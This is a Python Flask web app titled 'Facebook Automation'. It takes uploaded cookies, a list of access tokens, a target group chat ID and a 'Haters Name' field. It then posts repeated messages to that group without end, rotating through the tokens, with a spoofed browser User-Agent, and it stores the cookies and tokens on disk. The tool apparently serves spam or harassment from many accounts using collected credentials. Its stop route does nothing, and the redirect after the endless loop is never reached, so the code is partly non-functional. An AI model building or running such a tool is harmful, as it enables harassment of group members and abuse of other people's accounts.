from flask import Flask, request, render_template, redirect, url_for
import os
import time
import requests
import json

app = Flask(__name__)

# Static variables for headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

@app.route('/')
def index():
    return '''
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook Automation</title>
            <style>
                body {
                    background-color: rgb(0, 0, 0);
                    color: white;
                    font-family: Arial, sans-serif;
                }
                .container {
                    max-width: 800px;
                    margin: auto;
                    padding: 20px;
                    background: rgba(0, 0, 0, 0.7);
                    border-radius: 10px;
                    box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
                }
                h1 {
                    text-align: center;
                    color: white;
                    font-size: 32px;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                .form-control {
                    width: 100%;
                    padding: 10px;
                    border-radius: 5px;
                    border: 1px solid #ccc;
                }
                .btn {
                    padding: 10px 20px;
                    background-color: rgb(0, 255, 0);
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                }
                .btn:hover {
                    background-color: red;
                }
                .stop-btn {
                    background-color: rgb(255, 0, 0);
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Facebook Automation</h1>
                <form action="/start" method="POST" enctype="multipart/form-data">
                    <div class="form-group">
                        <label for="cookiesFile">Select Cookie File:</label>
                        <input type="file" class="form-control" id="cookiesFile" name="cookiesFile" required>
                    </div>
                    <div class="form-group">
                        <label for="txtFile">Select Tokens Text File:</label>
                        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
                    </div>
                    <div class="form-group">
                        <label for="targetGroupId">Target Group Chat ID:</label>
                        <input type="text" class="form-control" id="targetGroupId" name="targetGroupId" required>
                    </div>
                    <div class="form-group">
                        <label for="hatersName">Enter Haters Name:</label>
                        <input type="text" class="form-control" id="hatersName" name="hatersName" required>
                    </div>
                    <div class="form-group">
                        <label for="delay">Delay in Seconds:</label>
                        <input type="number" class="form-control" id="delay" name="delay" value="60" required>
                    </div>
                    <button type="submit" class="btn">Start Automation</button>
                </form>
                <form action="/stop" method="POST">
                    <button type="submit" class="btn stop-btn">Stop Automation</button>
                </form>
            </div>
        </body>
    </html>
    '''

@app.route('/start', methods=['POST'])
def start_automation():
    # Extract form data
    cookies_file = request.files['cookiesFile']
    tokens_file = request.files['txtFile']
    target_group_id = request.form['targetGroupId']
    haters_name = request.form['hatersName']
    delay = int(request.form['delay'])

    cookies = cookies_file.read().decode()  # Handle cookies for Facebook login
    tokens = tokens_file.read().decode().splitlines()

    # Create a folder for the session
    session_folder = f"session_{target_group_id}"
    os.makedirs(session_folder, exist_ok=True)

    # Save the cookies and tokens
    with open(os.path.join(session_folder, 'cookies.txt'), 'w') as f:
        f.write(cookies)

    with open(os.path.join(session_folder, 'tokens.txt'), 'w') as f:
        f.write("\n".join(tokens))

    # Placeholder for starting the automation
    print(f"Automation started for target group {target_group_id} with delay {delay} seconds.")
    
    # Simulating sending messages (in a loop)
    while True:
        for token in tokens:
            # Simulate a message send
            message = f"{haters_name} sending automated message!"
            payload = {'access_token': token, 'message': message}

            # Here, use the Facebook API to send the message to the group (simplified)
            url = f"https://graph.facebook.com/v15.0/{target_group_id}/messages"
            response = requests.post(url, json=payload, headers=headers)
            
            if response.status_code == 200:
                print(f"Message sent successfully: {message}")
            else:
                print(f"Failed to send message: {message}")
            
            time.sleep(delay)

    return redirect(url_for('index'))  # Redirect to the index page

@app.route('/stop', methods=['POST'])
def stop_automation():
    # Logic to stop the automation (e.g., setting a flag or killing the process)
    print("Automation stopped.")
    return redirect(url_for('index'))  # Redirect to the index page

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
            
